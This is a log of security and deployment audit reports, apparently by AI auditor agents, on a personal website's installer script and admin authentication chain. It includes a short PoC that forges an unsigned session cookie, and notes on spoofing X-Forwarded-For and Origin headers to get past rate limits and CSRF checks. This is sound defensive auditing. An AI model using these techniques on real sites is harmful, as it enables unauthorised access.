+       - If `curl` itself is missing (rare on modern Debian/Ubuntu, common on
+         minimal containers), script aborts at L51 with no fallback to `wget`
+       - NodeSource setup_22.x may fail on non-Debian/Ubuntu distros (Fedora, Arch,
+         Alpine) — script assumes apt-based distro without checking
+       - If `node` exists at /root/.nvm/... (NVM install), `which node` resolves to
+         that path; systemd ExecStart=$(which node) bakes it in, but service runs
+         as `ehsansite` user with `ProtectHome=true` → may be inaccessible
+
+Q3. Will it work if Nginx is already running? (port conflict)
+    ⚠ PARTIAL. L66-75:
+       - If `nginx` binary present: skip install, `apt install -y sqlite3 python3 ufw
+         certbot python3-certbot-nginx 2>/dev/null || true` (silent failure if
+         packages not in apt cache — no `apt update` first)
+       - If `nginx` binary absent: apt update + install + enable + start
+       Issues:
+       - No detection of what is listening on port 80/443 (Apache, Caddy, lighttpd)
+         — `systemctl start nginx` may fail silently if port 80 is taken, and
+         nginx -t still passes (config is valid), so script reports success
+       - Existing nginx config in sites-enabled/default is removed (good)
+       - Symlink at sites-enabled is force-replaced (good, `ln -sf`)
+
+Q4. Will it work if /home/ehsan/personal-site doesn't exist? (assumes cwd)
+    ✅ YES for install.sh itself. L17: `SITE_DIR="$(cd "$(dirname "$0")" && pwd)"`
+       resolves wherever the script lives. README tells user to unzip into
+       personal-site/ then `sudo ./install.sh`, so SITE_DIR = wherever they unzipped.
+       Issues:
+       - The header comment of `scripts/reset-admin-password.sh` says
+         `cd /home/ehsan/personal-site` (hardcoded) — documentation only, script
+         itself uses $SCRIPT_DIR. Just confusing.
+       - `scripts/keep-alive.sh` L1: `cd /home/z/my-project` (hardcoded dev path)
+         — script would fail on VPS, but it's not invoked by install.sh
+       - `scripts/list_messages.py` L4: `DB = Path("/home/z/my-project/db/custom.db")`
+         (hardcoded) — fails on VPS, but not invoked by install.sh
+
+Q5. Will the database seed work?
+    ❌ ABSOLUTELY NOT. See C1-C4 in summary.
+       - install.sh L132 counts tables (0 on fresh install)
+       - L135-138 runs 4 python scripts with `2>&1 | tail -1 || true`
+       - `seed_content.py` and `seed_equipment.py` only print "ready" — they don't
+         create tables or rows; they assume tables exist
+       - `seed_texts.py` does INSERT into SiteText (which doesn't exist) →
+         sqlite3.OperationalError "no such table: SiteText" → exit 1 → masked by
+         `| tail -1 || true`
+       - `seed_access_users.py` explicitly checks for AccessUser table and exits
+         with `sys.exit(1)` if missing ("Run: bunx prisma db push")
+       - Even if tables existed, `seed_access_users.py` L24 calls
+         `require('/home/z/my-project/node_modules/bcryptjs')` via node -e — that
+         path exists only on the dev machine, NOT on the VPS
+       - Even if the path were fixed to `./node_modules/bcryptjs`, the package
+         doesn't ship bcryptjs (verified) — node would throw MODULE_NOT_FOUND
+       - No fallback: no `prisma db push`, no inline `bcrypt.hashSync` replacement
+       - Net result: 0 admin users, 0 tables, 0 seed data — site is non-functional
+
+Q6. Will certbot succeed without domain pointing?
+    ⚠ NO — but failure is at least non-fatal (HTTPS section is best-effort).
+       - L232-238: `host "$domain" &>/dev/null` checks DNS resolution. If domain
+         doesn't resolve at all → loop ends with DOMAIN_FOUND="" → fall through
+         to L251-254 "دامنه‌ای DNS ست نشده. فعلاً HTTP." → SITE_URL set to
+         hardcoded IP `http://31.70.76.10:3000` (H2 — wrong on any other VPS)
+       - If domain DOES resolve but to a different IP (e.g., old DNS record, parked
+         page), `host` succeeds → certbot is invoked → certbot fails because
+         Let's Encrypt HTTP-01 challenge can't reach this VPS. Script catches this
+         at L246-250 and falls back to `http://$DOMAIN_FOUND` (better than crash)
+       - `--register-unsafely-without-email` means no expiry warnings (M4)
+       - Missing `--redirect` flag → HTTP not auto-redirected to HTTPS after cert
+       - Missing `--hsts` flag → HSTS header not added by certbot (would need
+         separate nginx config; nginx-ehsanmorad.conf has no HSTS directive)
+
+Q7. Will the systemd service start correctly?
+    ⚠ PARTIAL — depends on install location.
+       - L174-199: service file looks correct (User=ehsansite, WorkingDirectory,
+         ExecStart=$(which node) server.js, Restart=always, hardening flags)
+       - L169-172: useradd + chown -R before service file creation — order OK
+       - L201-203: daemon-reload + enable + restart — correct
+       Issues:
+       - `ProtectHome=true` (L193) hides /home, /root, /run/user from the service.
+         If user unzipped package to /home/ehsan/personal-site (the documented
+         location), WorkingDirectory would be inaccessible. ReadWritePaths=$SITE_DIR
+         (L194) creates an exception for that one path, so the service MIGHT work
+         — but this is fragile and unverified. Any subpath access outside $SITE_DIR
+         (e.g., /home/ehsan/.npmrc) would fail.
+       - `NoNewPrivileges=true` + `ProtectSystem=full` + `PrivateTmp=true` — fine
+       - ExecStart uses `$(which node)` resolved at install time. If node is at
+         /usr/bin/node (typical), OK. If node is at /root/.nvm/... (NVM as root),
+         the path won't be accessible to the ehsansite user → service fails.
+       - `sleep 5` (L204) before curl check may be too short for Next.js boot
+         (verified at ~3-8s on a 2GB VPS with the 17MB Prisma native binary load)
+
+Q8. Are the paths correct (absolute vs relative)?
+    ⚠ MIXED. install.sh uses $SITE_DIR (absolute) for systemd/nginx paths — good.
+       But scripts/ directory contains hardcoded dev-machine paths:
+       - `scripts/seed_access_users.py:24`: `require('/home/z/my-project/node_modules/bcryptjs')` ❌
+       - `scripts/list_messages.py:4`: `DB = Path("/home/z/my-project/db/custom.db")` ❌
+       - `scripts/keep-alive.sh:1`: `cd /home/z/my-project` ❌
+       - `scripts/keep-alive.sh:3`: log to `/home/z/my-project/dev.log` ❌
+       - `scripts/generate-v16-tutorial.js:67`: writes to `/home/z/my-project/download/TUTORIAL_FA_V16.docx` ❌
+       - `scripts/reset-admin-password.sh`: uses `./node_modules/bcryptjs` (relative, OK
+         IF bcryptjs were shipped — but it isn't)
+       - `server.js` nextConfig: `outputFileTracingRoot:"/home/z/my-project"`,
+         `repoRoot:"/home/z/my-project"`, `turbopack.root:"/home/z/my-project"`
+         (cosmetic — runtime Next.js doesn't access these; informational)
+       - install.sh L107: `DATABASE_URL="file:$SITE_DIR/db/custom.db"` — absolute,
+         but src/lib/db.ts ignores it and rebuilds path from process.cwd()
+         (so this is OK)
+
+Q9. Are permissions set correctly?
+    ✅ MOSTLY.
+       - L94-95: `mkdir -p db && chmod 700 db` — good
+       - L118: `chmod 600 .env` — good
+       - L127-128: `touch db/custom.db && chmod 600 db/custom.db` — good
+       - L172: `chown -R ehsansite:ehsansite "$SITE_DIR"` — applied AFTER file
+         creation, so ehsansite owns .env, db/, db/custom.db — good
+       - systemd service file at /etc/systemd/system/personal-site.service — owned
+         by root (default) — good
+       - L83-85: ufw rules — only applied if ufw is installed
+       Issues:
+       - L73 installs `ufw` ONLY when nginx is missing. If nginx is already
+         present, the `apt install -y ... 2>/dev/null || true` may fail silently
+         (e.g., stale apt cache) and ufw never gets enabled
+       - L82-85: `ufw allow 22/tcp 2>/dev/null || true` — silent failure if ufw
+         isn't installed yet — user might be locked out of SSH after
+         `ufw --force enable` if 22 wasn't actually allowed
+       - `npm install --legacy-peer-deps` referenced in reset-admin-password.sh
+         error message L37 — but package is standalone, no package-lock shipped,
+         bcryptjs not in deps → reset would fail
+
+Q10. Will the user be able to login after install?
+     ❌ NO. (See Q5.)
+        - No admin user is created (seed fails silently)
+        - The /user-login page (verified at src/app/user-login/page.tsx) exists
+        - The login API at src/app/api/user/login/route.ts works correctly
+        - But there is no row in AccessUser table → /api/user/login returns
+          "invalid_credentials" for any username/password combination
+        - The script's final output L272-277 confidently prints:
+            username: admin
+            password: admin123
+            ⚠️ حتماً از پنل → تنظیمات → تغییر رمز عوض کن!
+          These credentials will NOT work. User has no way to log in.
+        - reset-admin-password.sh would also fail (Q9: no bcryptjs shipped)
+
+Q11. Will reCAPTCHA be configured?
+     ❌ NO by default — intentionally.
+        - L102-103: grep existing .env for RECAPTCHA_SECRET and
+          NEXT_PUBLIC_RECAPTCHA_SITEKEY — on fresh install, .env doesn't exist,
+          so both EXISTING_RECAPTCHA_* variables are empty strings
+        - L113-114: .env is written with these empty values:
+            RECAPTCHA_SECRET=""
+            NEXT_PUBLIC_RECAPTCHA_SITEKEY=""
+        - L278-287: install.sh prints clear manual setup instructions — good UX
+        - L287: "⚠️ بدون reCAPTCHA، فرم تماس کار نمی‌کنه!" — accurate
+        - Verified: contact form requires reCAPTCHA server-side (per AUDIT-01
+          notes — fail-closed if RECAPTCHA_SECRET is empty)
+        - Net: contact form is non-functional until user manually edits .env and
+          restarts the service. This is documented but not automated.
+
+Q12. Will HTTPS be set up?
+     ⚠ CONDITIONAL.
+        - If DNS for one of [ehsanmorad.ir, ehsan-morad.ir, ehsanmorad.id.ir] points
+          to this VPS: certbot runs (L243), HTTPS is configured
+        - If DNS doesn't point here: HTTP only, hardcoded IP URL printed (H2)
+        - If certbot fails (e.g., rate-limit, network issue): script falls back to
+          `http://$DOMAIN_FOUND` (L249) — graceful
+        - Missing `--redirect` (HTTP→HTTPS auto-redirect not configured)
+        - Missing `--hsts` (HSTS not added by certbot)
+        - nginx-ehsanmorad.conf has no HSTS header (verified in package) — HSTS
+          would only come from Next.js middleware (AUDIT-01 confirmed HSTS is set
+          in middleware when NODE_ENV=production)
+        - certbot uses `--register-unsafely-without-email` — no expiry warnings
+
+Q13. Are there any syntax errors in the script?
+     ✅ NO. `bash -n /home/z/my-project/install.sh` → exit 0
+        - `bash -n` on package's install.sh → exit 0
+        - Heredoc quoting correct (EOF unquoted → variables expand as intended)
+        - No unbalanced braces/brackets
+        - BUT: bash -n only catches syntax, not logical errors. The script has
+          multiple logical issues documented in this report.
+
+Q14. Does it print the correct URLs at the end?
+     ⚠ PARTIAL.
+        - L269-270: SITE_URL printed — correct when $DOMAIN_FOUND is set OR IP
+          fallback matches this VPS
+        - L273: `$SITE_URL/user-login` — correct path (verified route exists)
+        - L282: `$SITE_DIR/.env` — correct absolute path
+        - Issues:
+          * H1: Webhook URLs at L290-291 use `$DOMAIN_FOUND` directly, NOT $SITE_URL.
+            If $DOMAIN_FOUND is empty (no DNS), prints `https:///api/bale/webhook?secret=...`
+            (malformed). Should use $SITE_URL or fall back to IP:3000.
+          * H2: IP fallback `http://31.70.76.10:3000` is hardcoded — wrong on any
+            VPS not at this IP. Should detect via `hostname -I | awk '{print $1}'`
+            or `curl -s ifconfig.me`.
+          * Port mismatch: when domain is found, SITE_URL has no port (443 default
+            for HTTPS). When no domain, SITE_URL has :3000. The nginx config listens
+            on 80 only (not 443 before certbot, not 3000). So `http://<ip>:3000`
+            works (direct to Next.js), but `http://<ip>:80` would also work (via
+            nginx proxy). User told to use :3000 — slightly confusing.
+          * L290-291: webhook URLs are HTTPS even when certbot failed and $SITE_URL
+            is HTTP. Should match $SITE_URL scheme.
+
+Q15. Is the webhook URL printed correctly?
+     ❌ NO (when no domain resolves).
+        - L290: `Bale:    https://$DOMAIN_FOUND/api/bale/webhook?secret=$BALE_SECRET`
+        - L291: `Telegram: https://$DOMAIN_FOUND/api/telegram/webhook?secret=$TG_SECRET`
+        - If $DOMAIN_FOUND is empty: prints `https:///api/bale/webhook?secret=...`
+          (broken URL — three slashes after https:)
+        - If certbot failed but domain resolved: $DOMAIN_FOUND is set, so URL is
+          syntactically valid but uses HTTPS while the server is still HTTP —
+          webhook callback would fail
+        - Should use $SITE_URL (which has the correct scheme + host) instead of
+          $DOMAIN_FOUND
+        - Security note: secret in URL query string (F-19 from AUDIT-01) — leaked
+          to shell history, terminal scrollback, any log redirect. Webhook API
+          accepts X-Webhook-Secret header as alternative (verified in
+          src/app/api/bale/webhook/route.ts:25) — install.sh should print the
+          header-based form, not the query-string form.
+
+================================================================================
+STANDALONE PACKAGE VERIFICATION
+================================================================================
+
+Source: https://github.com/ldrcoir/ehsan-site/raw/main/public/install-v17.2.zip
+Size: 18,605,747 bytes (18MB — matches V17.2-FINAL claim of "18MB")
+MD5:  350d1ebd040ea39429b875be5b71927a
+Identical package at: https://github.com/ldrcoir/ehsan-site-private/raw/main/public/install-v17.2.zip
+Files: 1404 total
+
+PACKAGE LAYOUT (top-level, personal-site/):
+  .env.example                 621 bytes  ✅ present (placeholder only, no secrets)
+  .next/static/                            ✅ present (chunks, media, manifests)
+  Caddyfile                  1819 bytes    ✅ present (alternative to nginx)
+  README.md                  1612 bytes    ✅ present (V17.2 reference correct)
+  VERSION.txt                 8189 bytes   ⚠ present but content says V17.1 (5×)
+  db/                          (empty)     ✅ present (no dev DB shipped — good)
+  install.sh                 11153 bytes   ✅ present, executable (755)
+  nginx-ehsanmorad.conf      2202 bytes    ✅ present
+  node_modules/                10 packages  ⚠ minimal (Next.js standalone trace)
+  package.json                 905 bytes   ✅ present
+  prisma/schema.prisma       16418 bytes   ✅ present (needed at runtime)
+  public/                      5 files     ✅ present (icons, logo, robots, manifest)
+  scripts/                      9 files    ✅ present
+  server.js                   7301 bytes   ✅ present (standalone entry point)
+
+REQUIRED FILE CHECKLIST:
+  ✅ install.sh        (executable 755, syntax valid)
+  ✅ server.js         (standalone Next.js entry, executable 664)
+  ✅ package.json      (declares deps but standalone doesn't run npm)
+  ✅ .env.example      (no secrets — placeholder only)
+  ✅ prisma/schema.prisma (required by outputFileTracingIncludes)
+  ✅ node_modules/next (Next.js runtime)
+  ✅ node_modules/.prisma/client/ (Prisma client + libquery_engine-debian-openssl-3.0.x.so.node, 17MB)
+  ✅ node_modules/react, react-dom, styled-jsx, semver, @next/env, @swc/helpers, etc.
+  ✅ .next/static/     (CSS, JS chunks, woff2 fonts)
+  ✅ public/           (static assets)
+  ✅ nginx-ehsanmorad.conf (nginx vhost for 3 domains)
+  ✅ Caddyfile         (alternative reverse proxy)
+  ❌ bcryptjs          (MISSING — required by scripts/seed_access_users.py
+                       and scripts/reset-admin-password.sh)
+  ❌ TUTORIAL_FA_V17.2.docx (MISSING — referenced in README.md but not shipped)
+  ❌ OLLAMA_GUIDE_FA.md     (MISSING — referenced in README.md but not shipped)
+
+SECRETS LEAK CHECK:
+  ✅ No .env file in package (only .env.example with empty values)
+  ✅ No SESSION_SECRET hardcoded anywhere (verified by grep)
+  ✅ No RECAPTCHA_SECRET values (only empty placeholders)
+  ✅ No bot tokens (Telegram/Bale) in any file
+  ✅ No API keys (sk- prefix, Bearer tokens, etc.)
+  ✅ No private keys (BEGIN PRIVATE KEY)
+  ✅ No DATABASE_URL with real paths (only .env.example with ./db/custom.db)
+  ⚠ "admin123" appears in 8 places (install.sh, README, VERSION.txt,
+     reset-admin-password.sh, seed_access_users.py) — this is the documented
+     default password, intentional but a known CRITICAL security issue (F-2
+     from AUDIT-01: default credentials seeded on every install)
+  ⚠ "31.70.76.10" hardcoded in install.sh (L253) and Caddyfile — leaks
+     the dev/deployment server's public IP
+
+DEV-MACHINE PATH LEAKS IN PACKAGE (would break on VPS):
+  server.js (nextConfig JSON):
+    - outputFileTracingRoot: "/home/z/my-project"
+    - repoRoot: "/home/z/my-project"
+    - turbopack.root: "/home/z/my-project"
+    (informational — Next.js doesn't access these at runtime)
+
+  scripts/seed_access_users.py:24 (CRITICAL):
+    const bcrypt = require('/home/z/my-project/node_modules/bcryptjs');
+    → fails on VPS (path doesn't exist; bcryptjs not in package)
+
+  scripts/list_messages.py:4:
+    DB = Path("/home/z/my-project/db/custom.db")
+    → fails on VPS
+
+  scripts/keep-alive.sh:1,3:
+    cd /home/z/my-project
+    >> /home/z/my-project/dev.log
+    → fails on VPS (not invoked by install.sh, but documented in package)
+
+  scripts/generate-v16-tutorial.js:67:
+    fs.writeFileSync("/home/z/my-project/download/TUTORIAL_FA_V16.docx", buffer)
+    → fails on VPS (not invoked by install.sh)
+
+PERMISSIONS CHECK (after unzip):
+  ✅ install.sh            755 (executable)
+  ✅ Caddyfile             755 (executable, though not a script — harmless)
+  ✅ nginx-ehsanmorad.conf 755 (same)
+  ✅ scripts/*.sh          755 (executable)
+  ✅ scripts/*.py          755 (executable)
+  ⚠ server.js              664 (rw-rw-r-- — should be 644 or 755; not a problem
+                              because ExecStart invokes node explicitly)
+  ⚠ VERSION.txt            755 (overly permissive for a text file)
+  ⚠ README.md              664
+  ⚠ .env.example           664
+
+================================================================================
+FINDINGS TABLE (severity-ordered)
+================================================================================
+
+| #    | Sev    | One-liner                                                                |
+|------|--------|--------------------------------------------------------------------------|
+| A-1  | CRIT   | install.sh never runs `prisma db push` — 0 tables created on fresh VPS  |
+| A-2  | CRIT   | seed_access_users.py hardcodes /home/z/my-project/node_modules/bcryptjs |
+| A-3  | CRIT   | bcryptjs NOT shipped in standalone package node_modules/                |
+| A-4  | CRIT   | Seed failures masked by `| tail -1 || true`; install reports success    |
+| A-5  | CRIT   | User cannot log in — no admin user created, credentials printed are fake|
+| A-6  | HIGH   | Webhook URL prints `https:///api/...` when $DOMAIN_FOUND is empty      |
+| A-7  | HIGH   | IP fallback `http://31.70.76.10:3000` hardcoded — wrong on other VPS    |
+| A-8  | HIGH   | reset-admin-password.sh requires ./node_modules/bcryptjs (not shipped)   |
+| A-9  | HIGH   | ProtectHome=true + WorkingDirectory under /home — fragile (relies on     |
+|      |        | ReadWritePaths exception; unverified)                                   |
+| A-10 | HIGH   | No `apt update` before `apt install nodejs` in NodeSource branch        |
+| A-11 | MED    | Webhook secret in URL query string (F-19 carryover — log/shell leak)    |
+| A-12 | MED    | VERSION.txt still says V17.1 (5×) — mismatch with install.sh V17.2      |
+| A-13 | MED    | README references TUTORIAL_FA_V17.2.docx and OLLAMA_GUIDE_FA.md — both  |
+|      |        | missing from package                                                     |
+| A-14 | MED    | `host` command not guaranteed installed (no apt install dnsutils)       |
+| A-15 | MED    | certbot missing --redirect (no HTTP→HTTPS auto-redirect)                 |
+| A-16 | MED    | certbot --register-unsafely-without-email (no expiry warnings)           |
+| A-17 | MED    | nginx-ehsanmorad.conf has no HSTS header (relies on Next.js middleware)  |
+| A-18 | MED    | scripts/keep-alive.sh, list_messages.py, generate-v16-tutorial.js have  |
+|      |        | hardcoded /home/z/my-project paths (would fail if invoked)              |
+| A-19 | MED    | `set -e` + no `set -o pipefail` — all pipe failures silently swallowed  |
+| A-20 | MED    | sleep 5 may be too short for Next.js+Prisma boot on 2GB VPS              |
+| A-21 | MED    | If `nginx -t` fails, `set -e` aborts script with no recovery path      |
+| A-22 | LOW    | Default admin/admin123 printed in final output (F-2 carryover — known    |
+|      |        | critical in AUDIT-01, but install.sh still instructs user to use these)  |
+| A-23 | LOW    | `cp .env .env` at L151 is a no-op (copies file to itself)                |
+| A-24 | LOW    | Webhook URLs use $DOMAIN_FOUND instead of $SITE_URL (scheme mismatch     |
+|      |        | when certbot failed but domain resolved)                                 |
+| A-25 | LOW    | No disk-space check; no verification that `openssl`, `curl`, `host`    |
+|      |        | are installed before use                                                 |
+| A-26 | LOW    | No `--hsts` flag for certbot; nginx config has no HSTS directive         |
+| A-27 | LOW    | Webhook secret printed in clear text in terminal output (F-19)           |
+| A-28 | LOW    | IP 31.70.76.10 leaked in install.sh and Caddyfile (dev/deploy server IP)|
+| A-29 | LOW    | No verification that port 3000 is free before systemd starts             |
+| A-30 | LOW    | package.json in package is the dev template (version 0.2.1, name        |
+|      |        | "nextjs_tailwind_shadcn_ts") — not reflective of the actual project     |
+
+================================================================================
+WHAT WORKS
+================================================================================
+✅ Bash syntax is valid (bash -n passes)
+✅ Node.js install logic (curl NodeSource setup_22.x) is correct for Debian/Ubuntu
+✅ systemd service file is well-formed with proper hardening
+✅ File permissions (.env 600, db 700, db/custom.db 600) are correct
+✅ chown -R ehsansite:ehsansite applied AFTER file creation
+✅ .env not shipped in package (only .env.example placeholder)
+✅ No real secrets leaked in package (no SESSION_SECRET, no bot tokens, no API keys)
+✅ Prisma native binary (libquery_engine-debian-openssl-3.0.x.so.node, 17MB) shipped
+✅ nginx config has 3-domain vhost (ehsanmorad.ir, ehsan-morad.ir, ehsanmorad.id.ir)
+✅ Caddyfile alternative shipped
+✅ install.sh is executable (755) in package
+✅ Both repo URLs (ehsan-site and ehsan-site-private) serve identical package
+✅ reCAPTCHA setup instructions are clear (manual but documented)
+✅ /user-login route exists and is referenced correctly
+✅ Webhook API accepts X-Webhook-Secret header (alternative to query string)
+✅ swap creation logic is correct (fallocate → dd fallback)
+✅ ufw opens 22/80/443
+
+================================================================================
+FIX RECOMMENDATIONS (ADVISORY ONLY — DO NOT APPLY per task instructions)
+================================================================================
+Priority order:
+ 1. A-1: Add `npx prisma db push --accept-data-loss` (or `bunx prisma db push`)
+    after db/custom.db creation, before running python seeds.
+    Requires `prisma` CLI — either ship it in node_modules/ or install via
+    `npm install -g prisma` (adds ~50MB).
+ 2. A-3: Ship `bcryptjs` in standalone package node_modules/, OR rewrite
+    seed_access_users.py to use Node's built-in `crypto.scryptSync` (no
+    external dep), OR ship a small `hash.js` script that uses @prisma/client's
+    internal bcrypt (if available).
+ 3. A-2: Replace `require('/home/z/my-project/node_modules/bcryptjs')` with
+    `require('./node_modules/bcryptjs')` (after A-3 ships it).
+ 4. A-4: Remove `| tail -1 || true` from seed invocations; add `set -o pipefail`
+    early in script; check exit codes and abort on seed failure.
+ 5. A-6: Replace `https://$DOMAIN_FOUND` with `"$SITE_URL"` in webhook URL
+    output (L290-291).
+ 6. A-7: Replace hardcoded `31.70.76.10` with `$(hostname -I | awk '{print $1}')`
+    or `$(curl -s ifconfig.me 2>/dev/null)`.
+ 7. A-8: Fix reset-admin-password.sh to use the same hashing path as
+    seed_access_users.py (after A-2/A-3 are fixed).
+ 8. A-12: Regenerate VERSION.txt to reference V17.2 (5 occurrences of V17.1).
+ 9. A-13: Either ship TUTORIAL_FA_V17.2.docx and OLLAMA_GUIDE_FA.md, or remove
+    the references from README.md.
+ 10. A-15: Add `--redirect --hsts` to certbot invocation (L243).
+ 11. A-22 (carryover F-2): Generate a random admin password at install time,
+     print it once, force password change on first login (requires
+     mustChangePassword column — see AUDIT-01 F-2).
+ 12. A-19: Add `set -o pipefail` after `set -e` (L15).
+ 13. A-27: Print webhook secret separately and instruct user to set it as
+     X-Webhook-Secret header in Bale/Telegram bot config (not in URL).
+
+================================================================================
+NO CODE CHANGES MADE (read-only audit per task instructions)
+================================================================================
+--- end Task ID: V17.2-FINAL-AUDIT-3 ---
+
+--- Task ID: V17.2-FINAL-AUDIT-1 ---
+Agent: Senior Security Auditor (sub agent, V17.2-FINAL-AUDIT-1)
+Task: OBSESSIVE end-to-end audit of the admin access chain
+Scope: Every path that grants /api/admin/* or /user-dashboard access
+Mode: READ-ONLY. NO code changes made.
+
+================================================================================
+EXECUTIVE SUMMARY
+================================================================================
+Audit revisits the V17.2-AUDIT-01 findings (F-1..F-30) and the V17.2-FINAL
+"fixes" claim. The V17.2-FINAL fix list confirms 6 of the prior 30 findings
+were partially addressed:
+
+  ✅ F-4   change_password now requires `currentPassword`
+            (src/app/api/admin/security/route.ts:62-84)
+  ✅ F-20  /api/messages removed from PUBLIC_API_PREFIXES → CSRF enforced
+            (src/middleware.ts:24-37; middleware.ts:188)
+  ✅ F-27  HSTS header set on HTTPS responses
+            (src/middleware.ts:210-213)
+  ✅ F-12  Cookie `secure` flag conditional on NODE_ENV
+            (src/app/api/user/login/route.ts:108)
+  ✅ F-1*  SESSION_SECRET lazy-loaded — build no longer hard-fails on missing env
+            (src/lib/access-auth.ts:19-43) — but middleware still DOES NOT
+            verify HMAC. Partial fix only.
+  ✅ F-8*  Body size limit 1MB added to middleware
+            (src/middleware.ts:195-205)
+
+BUT 24 of 30 prior findings REMAIN OPEN, and 10 NEW findings were identified
+in this end-to-end audit (NEW-1..NEW-10). Severity breakdown:
+
+  CRITICAL: 2  (F-2, F-3 + F-NEW-1)
+  HIGH:     6  (F-1, F-4 residual, F-5, F-6, F-7, F-8, F-9, F-NEW-5)
+  MEDIUM:   7  (F-10, F-11, F-14, F-15, F-16, F-17, F-18, F-NEW-2,3,4,9,10)
+  LOW:      8  (F-13, F-19, F-21, F-22, F-23, F-24, F-25, F-26, F-28, F-29,
+              F-30, F-NEW-6,7,8)
+
+The CRITICAL finding is unchanged from V17.2-AUDIT-01: the admin password
+fallback in `checkAdminAuth` (src/lib/admin-auth.ts:37-55) is a STILL-OPEN
+BACKDOOR that bypasses every session/cookie/CSRF protection layered on top.
+The V17.2-FINAL "removal" was a UI-level removal of the `#admin` hash route
+in the dashboard, NOT a removal of the underlying auth fallback. The API
+still accepts `password` in body/URL across 16 endpoints.
+
+================================================================================
+FILE-BY-FILE VERIFICATION
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+FILE 1: src/middleware.ts
+────────────────────────────────────────────────────────────────────────────────
+
+[1.1] MATCHER COVERAGE (matcher: lines 220-228)
+  Pattern: "/((?!_next/static|_next/image|favicon.ico|.*\\.(?:png|jpg|jpeg|gif|webp|svg|ico|txt|xml|css|js|woff|woff2|ttf|eot)$).*)"
+  Verified coverage:
+    /api/admin/content            ✓ matched
+    /api/admin/users              ✓ matched
+    /api/admin/users/<id>         ✓ matched (dynamic)
+    /api/admin/users/logs         ✓ matched
+    /api/admin/security           ✓ matched
+    /api/admin/security-dashboard ✓ matched
+    /api/admin/settings           ✓ matched
+    /api/admin/email              ✓ matched
+    /api/admin/equipment          ✓ matched
+    /api/admin/nav                ✓ matched
+    /api/admin/providers          ✓ matched
+    /api/admin/reply              ✓ matched
+    /api/admin/chat-reply         ✓ matched
+    /api/admin/clear              ✓ matched
+    /api/admin/clips              ✓ matched
+    /api/admin/stats              ✓ matched
+    /api/admin/text               ✓ matched
+    /api/admin/themes             ✓ matched
+    /api/messages                 ✓ matched (also explicitly gated at line 188)
+    /user-dashboard               ✓ matched
+    /user-dashboard/<sub>         ✓ matched
+  Excluded (intentional, correct): _next/static, _next/image, favicon, asset
+    extensions (png/jpg/svg/css/js/woff/etc.)
+  Verdict: ✅ No bypass via matcher.
+
+[1.2] hasValidSession (lines 70-93) — STILL CRITICAL DEFENSE-IN-DEPTH FAILURE
+  Code (lines 80-89):
+    const decoded = Buffer.from(decodeURIComponent(token), "base64").toString("utf8");
+    const parts = decoded.split(".");
+    if (parts.length !== 3) return false;
+    const [userId, expiresAtStr] = parts;
+    const expiresAt = parseInt(expiresAtStr, 10);
+    if (isNaN(expiresAt) || Date.now() > expiresAt) return false;
+    // در middleware نمی‌تونیم HMAC رو verify کنیم چون SESSION_SECRET بهش دسترسی نداریم
+    return userId.length > 0;
+  Issue: HMAC signature (parts[2]) is parsed but NEVER compared. Middleware
+    trusts any structurally-valid token with future expiry. The comment on
+    line 87 is FACTUALLY WRONG: Next.js middleware running on Node runtime
+    CAN read `process.env.SESSION_SECRET`. Even on Edge runtime, env vars
+    prefixed with `NEXT_PUBLIC_` are inlined, but server-only env vars are
+    accessible via `process.env` when the middleware runs server-side.
+  Impact: Forged cookie PASSES middleware redirect (lets attacker view
+    /user-dashboard HTML shell), but is REJECTED at API layer by
+    verifySessionToken (access-auth.ts:78-96). Defense-in-depth failure, not
+    direct exploit.
+  Severity: HIGH (downgraded from V17.2-AUDIT-01's CRITICAL — direct bypass
+    was incorrect; API layer still verifies HMAC).
+  PoC:
+    # Attacker with XSS (or shared dev cookie) forges a cookie that passes
+    # middleware redirect on /user-dashboard:
+    node -e "
+      const payload = 'fake-userid.' + (Date.now() + 86400000) + '.no-sig';
+      const fake = Buffer.from(payload).toString('base64');
+      console.log('access_session=' + encodeURIComponent(fake));
+    "
+    # Set document.cookie = above (via XSS). Browser sends it. Middleware
+    # accepts (hasValidSession returns true). Page loads. Client-side
+    # /api/user/verify rejects (HMAC fails) → client redirects to /user-login.
+    # Net effect: attacker gets the dashboard HTML shell for ~1 frame, no data.
+
+[1.3] Rate Limit Logic (lines 42-65, 144-155) — TWO MAJOR GAPS
+  Code:
+    const rateLimitMap = new Map<string, { count: number; resetAt: number }>();
+    ...
+    if (RATE_LIMIT_PATHS.includes(pathname)) {
+      const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
+                 req.headers.get("x-real-ip") || "unknown";
+      const max = pathname === "/api/user/login" ? 5 : 8;
+      if (!checkRateLimit(`${pathname}:${ip}`, max)) {
+        return NextResponse.json({ ok: false, error: "rate_limit" }, { status: 429, ... });
+      }
+    }
+  Gaps:
+    (a) RATE_LIMIT_PATHS (line 21) = ["/api/user/login", "/api/contact", "/api/chat"].
+        NO /api/admin/* path is rate-limited. (See F-5.)
+    (b) X-Forwarded-For trusted blindly (line 145-146). Attacker sets
+        `X-Forwarded-For: <random-ip>` to get fresh quota per request.
+        (See F-9.)
+    (c) In-memory Map bypassable in multi-instance deployments. (See F-8.)
+    (d) Sweep interval (line 64) is 5 minutes — fine for single instance.
+  Verdict: Rate limit is enforced ONLY for /api/user/login (5/15min),
+    /api/contact (8/15min), /api/chat (8/15min). Admin endpoints: 0 rate limit.
+
+[1.4] CSRF Origin Check (lines 158-177) — CORRECT FOR BROWSER, BYPASSABLE FOR SCRIPTS
+  Code:
+    const isPublicApi = PUBLIC_API_PREFIXES.some(p => pathname === p || pathname.startsWith(p + "/"));
+    if ((method === "POST" || method === "PUT" || method === "DELETE") && !isPublicApi) {
+      const origin = req.headers.get("origin");
+      const host = req.headers.get("host");
+      if (!origin || !host) return 403;
+      try {
+        const originUrl = new URL(origin);
+        if (originUrl.host !== host) return 403;
+      } catch { return 403; }
+    }
+  Verdict for browser-mediated CSRF: ✅ Bulletproof when combined with
+    SameSite=strict cookie (login route line 109). Browser will not send
+    the access_session cookie on cross-site POST, AND middleware Origin
+    check would reject anyway.
+  Verdict for script-mediated CSRF (curl, Python requests, server-to-server):
+    ❌ Trivially bypassable. Scripts can set `Origin: https://victim.com`
+    AND `Host: victim.com` to pass the check.
+  Mitigation gap: No `Sec-Fetch-Site: same-origin` check (which is harder
+    to spoof for browser-mediated requests).
+  Severity: MEDIUM (defense-in-depth gap).
+
+[1.5] Body Size Limit (lines 196-205) — ENFORCED ✅
+  Code:
